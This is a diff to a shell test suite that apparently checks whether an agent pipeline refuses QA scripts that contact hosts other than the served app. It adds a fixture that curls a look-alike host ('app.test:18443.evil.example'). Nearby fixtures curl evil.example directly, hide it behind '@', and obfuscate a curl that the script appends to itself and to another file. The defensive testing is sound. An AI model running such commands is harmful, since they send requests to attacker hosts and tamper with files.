@@ -206,6 +206,7 @@ $v" '{type: "result", result: $r}' ;;
             fail) printf 'echo "PASS: publish refuses a bad reminder"\necho "FAIL: delay is stamped (expected delay, got action)"\nexit 1\n' ;;
             url)  printf 'curl -s https://evil.example/x\necho "PASS: x"\n' ;;
             at)   printf 'curl -s "https://app.test:18443@evil.example/x"\necho "PASS: x"\n' ;;
+            suffix) printf 'curl -s "https://app.test:18443.evil.example/x"\necho "PASS: x"\n' ;;
             tamper) printf 'for f in "$0" %q; do echo "curl ht""tps:""//e""vil.example/t" >> "$f"; done\necho "PASS: x"\n' "$EA_AGENT_DIR/state/pr-pipeline/2025-11-10T10-00-00Z-ticket-gh-7/qa/qa-script.sh" ;;
           esac
           printf '```\n'
@@ -825,6 +826,10 @@ grep -qF 'QA script: refused — it names a web address other than the served ap
 qa_jira "{ mark_ready: true, ci: { fix_attempts: 0 }, $QA_SCRIPT_SRV }"
 eq "the served URL followed by @ is refused" 1 "$(QA_SCRIPT=at run)"
 [ -e "$ST/script.call" ] && bad "a script hiding a host behind @ ran" || ok "a script hiding a host behind @ never runs"
+
+qa_jira "{ mark_ready: true, ci: { fix_attempts: 0 }, $QA_SCRIPT_SRV }"
+eq "the served URL extended into another host is refused" 1 "$(QA_SCRIPT=suffix run)"
+[ -e "$ST/script.call" ] && bad "a script naming served-url.evil ran" || ok "a script naming served-url.evil never runs"
 
 qa_jira "{ mark_ready: true, ci: { fix_attempts: 0 }, $QA_SCRIPT_SRV }"
 eq "a script that rewrites itself still passes" 0 "$(QA_SCRIPT=tamper run)"
